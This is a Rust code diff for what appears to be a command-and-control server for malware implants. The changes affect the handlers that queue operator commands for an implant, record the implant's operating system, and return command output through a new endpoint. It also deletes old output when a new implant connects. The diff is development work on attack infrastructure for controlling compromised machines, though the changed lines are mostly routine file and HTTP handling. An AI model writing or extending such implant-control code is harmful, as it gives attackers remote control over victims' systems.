@@ -91,15 +91,10 @@ pub async fn operator_cmd(_req: HttpRequest, string: String) -> impl Responder {
     writeln!(&mut file, "{}", string.trim_end_matches("\r\n\0"))
         .expect("[-] Write next task file failed");
 
-    if string.trim_end_matches("\r\n\0").starts_with("cmd:") {
-        let output = read_output().await;
-        HttpResponse::Ok().body(format!("{}", output))
-    } else {
-        HttpResponse::Ok().body(format!(
-            "[+] Command '{}' sent to implant",
-            string.trim_end_matches("\r\n\0")
-        ))
-    }
+    HttpResponse::Ok().body(format!(
+        "[+] Command '{}' sent to implant",
+        string.trim_end_matches("\r\n\0")
+    ))
 }
 
 pub async fn implant_os(bytes: Bytes) -> impl Responder {
@@ -110,6 +105,12 @@ pub async fn implant_os(bytes: Bytes) -> impl Responder {
     let mut file = File::create("os.txt").expect("[-] Create os file failed");
     file.write_all(os.as_bytes())
         .expect("[-] Write os file failed");
+
+    // When a new implant connects, all previous outputs are deleted
+    match std::fs::remove_file("output.txt") {
+        Ok(_) => (),
+        Err(_) => (),
+    }
 
     HttpResponse::Ok().body("OS written to file")
 }
@@ -143,18 +144,8 @@ where
     }
 }
 
-async fn read_output() -> String {
-    let mut timer = 0;
-    while File::open("output.txt").is_err() {
-        log::info!("Waiting for output file");
-        std::thread::sleep(std::time::Duration::from_secs(1));
-        timer += 1;
-        if timer > 15 {
-            log::warn!("No output file found");
-            return "No command found".to_string();
-        }
-    }
-    log::info!("Output file found");
+pub async fn read_output() -> impl Responder {
+    log::debug!("Output file found");
     let file = File::open("output.txt").expect("[-] Open output file failed");
     let mut reader = BufReader::new(file);
     let mut output = String::new();
@@ -163,5 +154,5 @@ async fn read_output() -> String {
         .expect("[-] Read output file failed");
     std::fs::remove_file("output.txt").expect("[-] Remove output file failed");
 
-    output
+    HttpResponse::Ok().body(format!("{}", output))
 }
